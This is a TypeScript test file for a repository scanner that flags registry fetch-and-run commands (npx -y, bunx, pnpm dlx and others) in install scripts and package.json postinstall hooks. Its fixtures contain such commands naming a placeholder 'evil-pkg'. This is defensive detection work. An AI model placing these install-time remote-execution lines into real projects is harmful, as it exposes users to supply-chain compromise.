import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. A registry runner (`npx`, `bunx`, `pnpm dlx`, ...) fetches
 * a package and runs it in one step: no file is staged for the other
 * rules to read and the download is not collected, so the install-time
 * run matched nothing.
 */
function findings(path: string, body: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(`${body}\n`) }],
  }).findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const RUNNERS: Record<string, string> = {
  "npx with the yes flag": "npx -y evil-pkg",
  "npx with a pinned version and arguments": "npx evil-pkg@latest run",
  "npx with an explicit package option": "npx --package evil-pkg tool",
  "npm exec": "npm exec --yes evil-pkg",
  bunx: "bunx evil-pkg",
  "bun x": "bun x evil-pkg",
  "pnpm dlx": "pnpm dlx evil-pkg",
  "yarn dlx": "yarn dlx evil-pkg",
  "a runner under sudo": "sudo npx -y evil-pkg",
};

test("a package fetched from a registry and run at install time is unsafe execution", () => {
  for (const [name, body] of Object.entries(RUNNERS)) {
    expect({
      name,
      findings: findings("install.sh", `#!/bin/sh\n${body}`),
    }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("a registry run in an install hook is install content", () => {
  expect(
    findings("package.json", '{"scripts":{"postinstall":"npx -y evil-pkg"}}'),
  ).toEqual(["package.json#scripts:unsafe-execution:high"]);
});

test("a registry run named in an install-surface script is unsafe execution", () => {
  expect(
    findings("setup.js", "import { $ } from 'bun';\nawait $`bunx evil-pkg`;"),
  ).toEqual(["setup.js:unsafe-execution:high"]);
});

test("package-manager commands that fetch nothing keep no finding", () => {
  for (const body of [
    // Local scripts and installs run through the manager are not a fetch.
    "npm run build",
    "bun run ./scripts/local.ts",
    "yarn install --frozen-lockfile",
    "pnpm install",
    // A runner asked only for its own version runs no package.
    "npx --version",
    "npm exec --version",
    // A path-prefixed runner is a local binary, not a registry fetch.
    "./node_modules/.bin/npx evil-pkg",
  ]) {
    expect({
      body,
      findings: findings("install.sh", `#!/bin/sh\n${body}`),
    }).toEqual({
      body,
      findings: [],
    });
  }
});

test("a registry run outside an install surface keeps no finding", () => {
  // The same words in ordinary source are a development-time choice the
  // author runs themselves, not code an install executes.
  expect(
    findings(
      "src/build.js",
      "import { execSync } from 'node:child_process';\nexecSync('npx tsc --noEmit');",
    ),
  ).toEqual([]);
  expect(
    findings(
      "src/notes.js",
      "// you can try it with: npx -y evil-pkg\nconsole.log(1);",
    ),
  ).toEqual([]);
});
